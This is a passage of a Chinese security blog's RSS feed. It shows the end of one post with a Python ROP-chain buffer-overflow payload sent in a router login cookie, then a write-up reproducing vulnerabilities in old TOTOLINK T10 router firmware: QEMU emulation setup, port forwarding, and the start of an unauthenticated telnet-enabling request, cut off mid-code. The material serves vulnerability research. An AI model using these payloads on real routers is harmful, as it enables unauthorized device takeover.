class=&#34;string&#34;&gt;&amp;quot;http://xxxxxxx:80/goform/hello&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl = &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;444&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot;.png&amp;quot;&lt;/span&gt;+p32(pop_r3)+p32(system_addr)+p32(mov_r0)+_&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cookie = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;Cookie&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;password=&amp;quot;&lt;/span&gt;+pl&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;requests.get(url=URL, cookies=cookie)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h1 id=&#34;坑&#34;&gt;&lt;a href=&#34;#坑&#34; class=&#34;headerlink&#34; title=&#34;坑&#34;&gt;&lt;/a&gt;坑&lt;/h1&gt;&lt;p&gt;1.gdb-multiarch .&amp;#x2F;bin&amp;#x2F;httpd 要对应启动的文件,不能是它的备份等,这可能和gdb的工作原理有关&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://www.52pojie.cn/thread-1674625-1-1.html&#34;&gt;https://www.52pojie.cn/thread-1674625-1-1.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;python共存问题&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Huang_8208_sibo/article/details/124762816&#34;&gt;https://blog.csdn.net/Huang_8208_sibo/article/details/124762816&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_38154820/article/details/122955197&#34;&gt;https://blog.csdn.net/qq_38154820/article/details/122955197&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/mRq3n3jDM0zvR15JAsLYSA&#34;&gt;https://mp.weixin.qq.com/s/mRq3n3jDM0zvR15JAsLYSA&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://tangzichengcc.github.io/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/</guid>
            <title>totolinkT10路由器老版本漏洞复现和分析</title>
            <link>https://tangzichengcc.github.io/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/</link>
            <category>路由器</category>
            <pubDate>Mon, 15 May 2023 19:01:15 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;文章同步于:&lt;a href=&#34;https://mp.weixin.qq.com/s/6kC02ABzeBnhjPeAs6lyrQ&#34;&gt;https://mp.weixin.qq.com/s/6kC02ABzeBnhjPeAs6lyrQ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&#34;一、环境搭建&#34;&gt;&lt;a href=&#34;#一、环境搭建&#34; class=&#34;headerlink&#34; title=&#34;一、环境搭建&#34;&gt;&lt;/a&gt;一、环境搭建&lt;/h1&gt;&lt;h2 id=&#34;1-1-获取和解压固件&#34;&gt;&lt;a href=&#34;#1-1-获取和解压固件&#34; class=&#34;headerlink&#34; title=&#34;1.1 获取和解压固件&#34;&gt;&lt;/a&gt;1.1 获取和解压固件&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;amp;id=15&amp;amp;ids=36&#34;&gt;http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;amp;id=15&amp;amp;ids=36&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; binwalk -Me TOTOLINK_CS185R_T10_IP04336_8197F_SPI_16M64M_V5.9c.1485_B20180122_ALL.web&lt;/p&gt;
&lt;p&gt;查看busybox获得架构信息, &lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@vultr:/tmp/squashfs-root/bin&lt;span class=&#34;meta&#34;&gt;# file busybox&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;busybox: ELF &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;-bit LSB executable, MIPS, MIPS32 rel2 version &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;, no section header&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;下载qemu&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;apt install qemu-user qemu-user-&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; qemu-system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;网桥工具&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt install bridge-utils uml-utilities&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;链接失效了,问同学要了一个&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https:&lt;span class=&#34;comment&#34;&gt;//people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2 &amp;amp;&amp;amp; wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;scp -r root@xxxx:&amp;#x2F;root&amp;#x2F;qemu&amp;#x2F;mipsel&amp;#x2F;debian_wheezy_mipsel_standard.qcow2 .&amp;#x2F;&lt;/p&gt;
&lt;p&gt;scp -r root@xxxx:&amp;#x2F;root&amp;#x2F;qemu&amp;#x2F;mipsel&amp;#x2F;vmlinux-3.2.0-4-4kc-malta .&amp;#x2F;&lt;/p&gt;
&lt;p&gt;网络配置&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;brctl addbr virbr2 # 创建网桥&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ifconfig virbr2 &lt;span class=&#34;number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt; up # 配置网桥IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tunctl -t tap2 # 添加虚拟网卡tap2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ifconfig tap2 &lt;span class=&#34;number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.11&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt; up # 配置虚拟网卡IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;brctl addif virbr2 tap2 # 配置虚拟网卡与网桥连接&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;启动虚拟机&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;qemu-system-mipsel -M malta -kernel vmlinux&lt;span class=&#34;number&#34;&gt;-3.2&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-4&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-4&lt;/span&gt;kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &lt;span class=&#34;string&#34;&gt;&amp;quot;root=/dev/sda1&amp;quot;&lt;/span&gt; -netdev tap,id=tapnet,ifname=tap2,script=no -device rtl8139,netdev=tapnet -nographic&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;登陆虚拟机、配置网络&lt;/p&gt;
&lt;p&gt;root&amp;#x2F;root&lt;/p&gt;
&lt;p&gt;ifconfig eth0 192.168.6.15 up # 配置路由器IP&lt;br&gt;scp -r squashfs-root&amp;#x2F; &lt;a href=&#34;mailto:&amp;#114;&amp;#111;&amp;#x6f;&amp;#x74;&amp;#64;&amp;#49;&amp;#x39;&amp;#x32;&amp;#x2e;&amp;#x31;&amp;#54;&amp;#x38;&amp;#46;&amp;#x36;&amp;#46;&amp;#49;&amp;#x35;&#34;&gt;&amp;#114;&amp;#111;&amp;#x6f;&amp;#x74;&amp;#64;&amp;#49;&amp;#x39;&amp;#x32;&amp;#x2e;&amp;#x31;&amp;#54;&amp;#x38;&amp;#46;&amp;#x36;&amp;#46;&amp;#49;&amp;#x35;&lt;/a&gt;:&amp;#x2F;root&amp;#x2F; # 拷贝路由器文件到虚拟机&lt;/p&gt;
&lt;p&gt;注意这里有个坑 &lt;/p&gt;
&lt;p&gt;就是上一个开启的qemu里面的squashfs-root不是要搭建的那个路由器的…很奇怪…不知道哪里来的…&lt;/p&gt;
&lt;p&gt;所以其实要先从物理机上考过去一份到qemu的debian系统里,然后再拷到路由系统里&lt;/p&gt;
&lt;p&gt;物理机&amp;#x2F;云服务器执行: scp -r &amp;#x2F;tmp&amp;#x2F;squashfs-root 192.168.6.15:&amp;#x2F;root&amp;#x2F; 拷贝到qemu虚拟出的debian里面&lt;/p&gt;
&lt;p&gt;qemu里执行 scp -r squashfs-root&amp;#x2F; &lt;a href=&#34;mailto:&amp;#114;&amp;#x6f;&amp;#x6f;&amp;#116;&amp;#x40;&amp;#x31;&amp;#x39;&amp;#50;&amp;#46;&amp;#x31;&amp;#x36;&amp;#x38;&amp;#46;&amp;#x36;&amp;#46;&amp;#49;&amp;#53;&#34;&gt;&amp;#114;&amp;#x6f;&amp;#x6f;&amp;#116;&amp;#x40;&amp;#x31;&amp;#x39;&amp;#50;&amp;#46;&amp;#x31;&amp;#x36;&amp;#x38;&amp;#46;&amp;#x36;&amp;#46;&amp;#49;&amp;#53;&lt;/a&gt;:&amp;#x2F;root&amp;#x2F;  拷贝到&lt;/p&gt;
&lt;p&gt;chroot .&amp;#x2F;squashfs-root&amp;#x2F; &amp;#x2F;bin&amp;#x2F;sh # 挂载路由器系统&lt;br&gt;.&amp;#x2F;bin&amp;#x2F;lighttpd -f .&amp;#x2F;lighttp&amp;#x2F;lighttpd.conf -m .&amp;#x2F;lighttp&amp;#x2F;lib # 启动路由器服务&lt;/p&gt;
&lt;p&gt;报错(server.c.624) opening pid-file failed: &amp;#x2F;var&amp;#x2F;run&amp;#x2F;lighttpd.pid No such file or directory&lt;/p&gt;
&lt;p&gt;创建一下即可&lt;/p&gt;
&lt;h2 id=&#34;1-2-流量转发&#34;&gt;&lt;a href=&#34;#1-2-流量转发&#34; class=&#34;headerlink&#34; title=&#34;1.2 流量转发&#34;&gt;&lt;/a&gt;1.2 流量转发&lt;/h2&gt;&lt;p&gt;怎么把流量转发出来呢?&lt;/p&gt;
&lt;p&gt;把qemu的流量转发到主机的端口&lt;/p&gt;
&lt;p&gt;ssh &lt;a href=&#34;mailto:&amp;#x72;&amp;#x6f;&amp;#x6f;&amp;#x74;&amp;#64;&amp;#49;&amp;#x39;&amp;#x32;&amp;#x2e;&amp;#49;&amp;#x36;&amp;#56;&amp;#46;&amp;#54;&amp;#x2e;&amp;#49;&amp;#53;&#34;&gt;&amp;#x72;&amp;#x6f;&amp;#x6f;&amp;#x74;&amp;#64;&amp;#49;&amp;#x39;&amp;#x32;&amp;#x2e;&amp;#49;&amp;#x36;&amp;#56;&amp;#46;&amp;#54;&amp;#x2e;&amp;#49;&amp;#53;&lt;/a&gt; -L 127.0.0.1:80:127.0.0.1:80&lt;/p&gt;
&lt;p&gt;把主机的流量转发到PC端口,就可以在自己电脑上访问了&lt;/p&gt;
&lt;p&gt;ssh root@xxxxxx (vps的ip) -L 127.0.0.1:80:127.0.0.1:80&lt;/p&gt;
&lt;p&gt;或者安装一个图形化界面(用服务器搭建的)&lt;/p&gt;
&lt;p&gt;ssh &lt;a href=&#34;mailto:&amp;#114;&amp;#111;&amp;#x6f;&amp;#x74;&amp;#64;&amp;#49;&amp;#x39;&amp;#x32;&amp;#46;&amp;#49;&amp;#x36;&amp;#x38;&amp;#46;&amp;#x36;&amp;#46;&amp;#x31;&amp;#x35;&#34;&gt;&amp;#114;&amp;#111;&amp;#x6f;&amp;#x74;&amp;#64;&amp;#49;&amp;#x39;&amp;#x32;&amp;#46;&amp;#49;&amp;#x36;&amp;#x38;&amp;#46;&amp;#x36;&amp;#46;&amp;#x31;&amp;#x35;&lt;/a&gt; -L 127.0.0.1:80:127.0.0.1:80&lt;/p&gt;
&lt;p&gt;或者直接一个转发就行了吧?(vps关了,还没尝试)&lt;/p&gt;
&lt;p&gt;ssh root@xxxxxx (vps的ip) -L 127.0.0.1:80:192.168.6.15:80&lt;/p&gt;
&lt;h2 id=&#34;1-3-虚拟环境的各种问题&#34;&gt;&lt;a href=&#34;#1-3-虚拟环境的各种问题&#34; class=&#34;headerlink&#34; title=&#34;1.3 虚拟环境的各种问题&#34;&gt;&lt;/a&gt;1.3 虚拟环境的各种问题&lt;/h2&gt;&lt;p&gt;登陆报错&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-05&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-07&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;46&lt;/span&gt;: (mod_cgi.c&lt;span class=&#34;number&#34;&gt;.1415&lt;/span&gt;) cleaning up CGI: process died with signal &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HTTP/&lt;span class=&#34;number&#34;&gt;1.1&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;200&lt;/span&gt; OK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Date: Sun, &lt;span class=&#34;number&#34;&gt;07&lt;/span&gt; May &lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;58&lt;/span&gt; GMT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Server: lighttpd/&lt;span class=&#34;number&#34;&gt;1.4&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-05&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-07&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;58&lt;/span&gt;: (mod_cgi.c&lt;span class=&#34;number&#34;&gt;.1415&lt;/span&gt;) cleaning up CGI: process died with signal &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-05&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-07&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;: (mod_cgi.c&lt;span class=&#34;number&#34;&gt;.588&lt;/span&gt;) cgi died, pid: &lt;span class=&#34;number&#34;&gt;2588&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-05&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-07&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;: (mod_cgi.c&lt;span class=&#34;number&#34;&gt;.1415&lt;/span&gt;) cleaning up CGI: process died with signal &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-05&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-07&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;09&lt;/span&gt;: (mod_cgi.c&lt;span class=&#34;number&#34;&gt;.1415&lt;/span&gt;) cleaning up CGI: process died with signal &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HTTP/&lt;span class=&#34;number&#34;&gt;1.1&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;200&lt;/span&gt; OK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Date: Sun, &lt;span class=&#34;number&#34;&gt;07&lt;/span&gt; May &lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt; GMT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Server: lighttpd/&lt;span class=&#34;number&#34;&gt;1.4&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-05&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-07&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;: (mod_cgi.c&lt;span class=&#34;number&#34;&gt;.1415&lt;/span&gt;) cleaning up CGI: process died with signal &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;访问home.asp直接下载文件了….&lt;/p&gt;
&lt;p&gt;换个版本?&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://toscode.gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518&#34;&gt;https://toscode.gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;TOTOLINK NR1800X&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;amp;id=70&amp;amp;ids=36&#34;&gt;http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;amp;id=70&amp;amp;ids=36&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;好奇怪..用user模式是这个,system模式就不是了…&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508070257022.png&#34; alt=&#34;image-20230508070257022&#34;&gt;&lt;/p&gt;
&lt;p&gt;把东西拷其进去后 404了 &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508072223637.png&#34; alt=&#34;image-20230508072223637&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是在服务器里面测试是好的&lt;/p&gt;
&lt;p&gt;搭建图形化界面&lt;a href=&#34;https://zhuanlan.zhihu.com/p/436458664&#34;&gt;https://zhuanlan.zhihu.com/p/436458664&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;vnc一开始连不上是防火墙的事,把防火墙关了,可以在图形化界面里直接访问&lt;/p&gt;
&lt;h2 id=&#34;1-4-真机&#34;&gt;&lt;a href=&#34;#1-4-真机&#34; class=&#34;headerlink&#34; title=&#34;1.4 真机&#34;&gt;&lt;/a&gt;1.4 真机&lt;/h2&gt;&lt;p&gt;​		因为自己的机器是mac,m1架构,搭建不了x86的虚拟机,就用的云服务器,比较麻烦,然后环境也有问题,于是买了一个真机,但是真机也有问题,导致自己很崩溃,通宵了一晚上去调试环境,但不论怎么搭建虚拟环境或者用真机,在登录页面点击登陆后,都登陆不进去&lt;/p&gt;
&lt;p&gt;​		后来无意中在百度贴吧搜索发现有人和我一样的问题……………居然是要用远古的ie或者360浏览器的兼容模式才能打开…&lt;/p&gt;
&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509154418746.png&#34; alt=&#34;image-20230509154418746&#34; style=&#34;zoom:33%;&#34;&gt;

&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/4022899e2b386926fcc791a13bcb575b.png&#34; alt=&#34;4022899e2b386926fcc791a13bcb575b&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;二、-获取初始shell&#34;&gt;&lt;a href=&#34;#二、-获取初始shell&#34; class=&#34;headerlink&#34; title=&#34;二、 获取初始shell&#34;&gt;&lt;/a&gt;二、 获取初始shell&lt;/h1&gt;&lt;h2 id=&#34;2-1-telnet&#34;&gt;&lt;a href=&#34;#2-1-telnet&#34; class=&#34;headerlink&#34; title=&#34;2.1 telnet&#34;&gt;&lt;/a&gt;2.1 telnet&lt;/h2&gt;&lt;p&gt;​		在路由器管理后台开启telnet功能,或者直接python发包获取(未授权)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;response = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&amp;quot;&lt;/span&gt;,data=&lt;span 